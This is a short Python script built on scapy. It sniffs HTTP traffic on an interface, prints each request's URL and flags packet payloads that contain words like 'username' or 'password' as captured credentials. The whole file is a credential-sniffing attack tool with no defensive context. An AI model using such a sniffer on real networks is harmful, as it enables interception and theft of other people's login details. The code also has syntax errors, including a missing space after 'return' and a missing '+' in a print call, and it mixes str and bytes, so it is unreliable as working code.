#!/usr/bin/python3

import scapy.all as scapy
from scapy.layers import http

keywords = ["username", "user", "login", "password", "pass"]

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet, filter="")

def get_url(packet):
    returnpacket[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
            load = packet[scapy.Raw].load
            for keyword in keywords:
                if keyword in load:
                    return load

def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        #print(packet.show()) # See all Packet layer fields
        url = get_url(packet)
        print("[+] HTTP Request >> " url)

        login_info = get_login_info(packet)
        if login_info:
            print("\n\n[+] Possible username/password > " + login_info + "\n\n")

        
        

sniff("eth0")